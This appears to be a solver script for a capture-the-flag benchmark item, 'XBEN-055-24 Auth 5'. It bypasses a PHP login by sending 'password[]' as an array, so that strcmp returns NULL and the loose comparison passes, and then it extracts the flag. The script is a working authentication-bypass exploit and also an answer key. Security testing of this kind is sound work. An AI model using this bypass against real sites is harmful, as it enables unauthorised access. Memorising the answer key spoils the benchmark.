#!/usr/bin/env bash
# XBEN-055-24 — "Auth 5" (tags: business_logic, privilege_escalation)
#
# `strcmp($_GET['password'], $password) == 0`, where `$password` is never
# assigned. Handed an *array* instead of a string, PHP's `strcmp` returns NULL,
# and `NULL == 0` is true. The password is not guessed; the comparison is made
# to answer wrong.
#
# `query.password[]` is a parameter whose name contains brackets, which is how
# PHP spells an array. h5i sets it literally: the edit language names parameters,
# it does not interpret them.
set -uo pipefail
URL="${1:?usage: $0 http://127.0.0.1:PORT}"
H5I="${H5I:-h5i}"
SESSION="xben055-$$"
trap '"$H5I" browser close --session "$SESSION" >/dev/null 2>&1' EXIT

"$H5I" browser open "$URL/" --session "$SESSION" --new --capture >/dev/null
REPLAY="$("$H5I" websec replay req_0 \
    --set 'query.username=admin' --set 'query.password[]=x' --create \
    --session "$SESSION" |
    python3 -c 'import json,sys; print(json.load(sys.stdin)["seq"])')"
"$H5I" websec match "res_$REPLAY" --regex 'FLAG\{[a-f0-9]{64}\}' --session "$SESSION" |
    python3 -c 'import json,sys; d=json.load(sys.stdin); print(d["conditions"][0]["captures"][0] if d["matched"] else "no flag found")'
